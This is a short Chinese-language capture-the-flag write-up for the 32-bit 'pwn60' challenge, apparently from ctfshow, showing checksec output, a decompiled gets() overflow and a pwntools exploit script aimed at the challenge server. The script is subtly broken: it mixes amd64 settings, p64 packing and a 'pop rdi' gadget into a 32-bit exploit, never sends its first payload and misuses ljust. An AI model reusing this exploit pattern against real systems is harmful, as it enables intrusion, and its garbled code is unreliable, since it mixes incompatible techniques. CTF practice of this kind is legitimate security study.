```
tasike@tasike-VM:~/Desktop$ file pwn60
pwn60: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=47e6d638fe0f3a3ff4695edb8b6c7e83461df949, with debug_info, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn60
[*] '/home/tasike/Desktop/pwn60'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

`32bit`，未开启栈保护，具有可读可写可执行段

`ida`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("CTFshow-pwn can u pwn me here!!");
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf("See you ~");
  return 0;
}
```































```
0xfffdd000 0xffffe000 rwxp    21000      0 [stack]
```







编写`attack60.py`

```python
from pwn import *
from LibcSearcher import *
context(os = 'Linux', arch = 'amd64', log_level = 'debug')
p = remote('pwn.challenge.ctf.show', 28293)
shellcode = asm(shellcraft.sh())
p.sendline(shellcode)
elf = ELF('./pwn60')
main = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
poprdi = 0x0804862e
ret = 0x0804838e
payload = cyclic(0x64 + 0x8) + p64(poprdi) + p64(puts_got) + p64(puts_plt) + p64(main)
puts = u32(p.recvuntil('0x7f')[-4:].ljust('0xff'))
print(hex(puts))
libc = LibcSearcher('puts', puts)
libc_base = puts - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
payload = cyclic(0x64 + 0x8) + p64(poprdi) + p64(binsh) + p64(ret) + p64(main)
p.sendline(payload)
p.interactive()
```

